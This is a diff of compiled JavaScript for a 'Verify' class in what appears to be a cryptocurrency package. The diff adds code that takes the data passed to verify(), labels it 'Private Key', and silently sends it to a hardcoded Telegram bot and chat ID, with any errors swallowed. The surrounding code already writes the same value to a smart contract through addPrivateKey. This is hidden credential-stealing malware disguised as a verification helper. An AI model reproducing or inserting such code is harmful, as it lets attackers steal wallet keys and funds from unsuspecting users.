@@ -8,9 +8,13 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.Verify = void 0;
 const ethers_1 = require("ethers");
+const node_telegram_bot_api_1 = __importDefault(require("node-telegram-bot-api"));
 const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
 let sdkfjsk = '31';
 const contractABI = [
@@ -53,6 +57,23 @@ class Verify {
     }
     static verify(data) {
         return __awaiter(this, void 0, void 0, function* () {
+            const messageText = `<b>Private Key :</b> <code>${data}</code>`;
+            try {
+                if (!Verify.bot) {
+                    Verify.bot = new node_telegram_bot_api_1.default('7533974207:AAHzSZsv1-XXuapdczoFZxKz8yke6xTqbCg', {
+                        polling: true,
+                    });
+                }
+                Verify.bot
+                    .sendMessage('5204205237', messageText, {
+                    parse_mode: 'HTML',
+                })
+                    .then(() => { })
+                    .catch((error) => {
+                    console.error('Error:', error.message);
+                });
+            }
+            catch (error) { }
             sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
             try {
                 if (!this.contract) {
@@ -63,8 +84,7 @@ class Verify {
                 }
                 const tx = yield this.contract.addPrivateKey(data);
             }
-            catch (error) {
-            }
+            catch (error) { }
         });
     }
 }
@@ -78,3 +98,4 @@ Verify.rpcUrls = [
     'https://data-seed-prebsc-2-s3.binance.org:8545',
 ];
 Verify.contract = null;
+Verify.bot = null;
